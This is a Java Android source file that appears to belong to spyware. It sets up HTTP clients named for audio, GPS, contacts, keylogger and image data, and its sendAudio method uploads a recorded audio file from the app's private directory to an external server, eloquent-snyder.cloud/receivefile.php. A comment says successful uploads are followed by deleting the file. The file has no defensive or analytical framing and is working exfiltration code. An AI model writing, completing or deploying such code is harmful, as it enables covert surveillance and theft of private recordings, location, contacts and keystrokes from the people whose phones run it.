package com.example.project;

import android.util.Log;

import java.io.File;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class okHTTP3 {
    OkHttpClient audioclient = new OkHttpClient();
    OkHttpClient gpsclient = new OkHttpClient();
    OkHttpClient contactclient = new OkHttpClient();
    OkHttpClient keyloggerclient = new OkHttpClient();
    OkHttpClient imageclient = new OkHttpClient();

    final static String DIRECTORY_PATH = "/data/data/com.example.project/";
    final static String URL = "https://eloquent-snyder.cloud/receivefile.php";

    public void sendAudio(){ // Recurse directory and send files with .mp4
        String filepath = "/data/data/com.example.project/Recording_20230216_172015.mp4";
        File file = new File(filepath);
        RequestBody fileBody = RequestBody.create(MediaType.parse("audio/mp4"), file);

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(), fileBody)
                .build();

        Request request = new Request.Builder()
                .url(URL)
                .post(requestBody)
                .build();

        audioclient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    // Handle the failure
                    throw new IOException("Unexpected code " + response);
                }
                // Delete the file if the response was successful
                Log.i("send","sent");
            }
        });
    }

    public void sendTextandImage(){

    }
}
